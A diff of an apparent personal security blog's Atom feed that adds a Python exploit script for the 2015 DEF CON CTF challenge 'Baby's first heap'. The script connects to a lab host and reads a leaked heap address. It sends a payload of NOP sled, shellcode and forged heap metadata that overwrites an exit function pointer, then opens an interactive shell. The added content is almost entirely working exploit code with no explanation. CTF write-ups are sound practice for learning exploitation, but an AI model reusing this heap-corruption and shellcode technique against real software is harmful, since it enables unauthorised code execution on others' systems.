@@ -4,7 +4,7 @@
   <title><![CDATA[pwn_expoit Blog]]></title>
   <link href="http://mashirogod.github.io/atom.xml" rel="self"/>
   <link href="http://mashirogod.github.io/"/>
-  <updated>2015-11-15T04:46:05-08:00</updated>
+  <updated>2015-11-15T04:58:12-08:00</updated>
   <id>http://mashirogod.github.io/</id>
   <author>
     <name><![CDATA[pwn_expoit]]></name>
@@ -18,7 +18,55 @@
     <link href="http://mashirogod.github.io/blog/2015/11/15/2015-defcon-babyfirstheap/"/>
     <updated>2015-11-15T04:21:48-08:00</updated>
     <id>http://mashirogod.github.io/blog/2015/11/15/2015-defcon-babyfirstheap</id>
-    <content type="html"><![CDATA[<p>File /home/pwn/Desktop/octopress/source/codeview/source/codeview/babyfirstheap.py could not be found</p>
+    <content type="html"><![CDATA[<figure class='code'><figcaption><span>[Baby's first heap] (babyfirstheap.py)</span> <a href='http://mashirogod.github.io/codeview/babyfirstheap.py'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="kn">from</span> <span class="nn">pwn_expoit</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
+</span><span class='line'><span class="n">a</span> <span class="o">=</span> <span class="mf">0.3</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">MakeCon</span><span class="p">():</span>
+</span><span class='line'>  <span class="n">MakeCon</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&quot;192.168.224.152&quot;</span><span class="p">,</span><span class="mi">4444</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">MakeCon</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">MakeCon</span><span class="p">()</span>
+</span><span class='line'><span class="n">leak</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;[size=260]&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">18</span><span class="p">:</span><span class="o">-</span><span class="mi">11</span><span class="p">]</span>
+</span><span class='line'><span class="n">hex_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s">&quot;0x&quot;</span><span class="o">+</span><span class="n">leak</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
+</span><span class='line'><span class="k">print</span> <span class="n">hex_addr</span>
+</span><span class='line'><span class="n">exit_func</span> <span class="o">=</span> <span class="mh">0x804c8ac</span>
+</span><span class='line'><span class="n">dat</span>  <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xeb\x0c</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">nopsled</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">shellcode</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">260</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">dat</span><span class="p">))</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x01\x00\x00\x00</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">exit_func</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">hex_addr</span><span class="p">)</span>
+</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">dat</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
 ]]></content>
   </entry>
   
